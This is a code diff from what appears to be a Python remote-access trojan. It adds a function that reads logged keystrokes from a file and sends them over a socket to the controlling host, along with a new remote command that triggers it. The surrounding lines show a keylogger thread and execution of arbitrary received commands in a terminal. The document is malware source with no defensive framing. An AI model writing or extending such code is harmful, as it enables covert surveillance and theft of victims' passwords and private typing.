@@ -314,6 +314,11 @@ stop_Init_Keylogger = False
 threadingInitKeylogger = threading.Thread(target=QueuKeyloggerEvent, args =(lambda : stop_Init_Keylogger, ))
 threadingInitKeylogger.start()
 
+def sendFileKeylogger():
+    with open("save.txt", "r") as file:
+        content = file.read()
+        Socket.sendall((content+"end").encode())
+
 def execute(data):
     global run, sortir, ossys, reloading, sendListenKeylogger
     data = data.replace("9", "")
@@ -362,9 +367,12 @@ def execute(data):
             sendListenKeylogger = True
         elif data == "listenKeyloggerFalse":
             sendListenKeylogger = False
+        elif datalist[0] == "python":
+            pass
+        elif data == "sendFileKeylogger":
+            sendFileKeylogger()
         else:
             terminal(data)
-
 
 run, progrun = True, True
 timeoutKill = 20
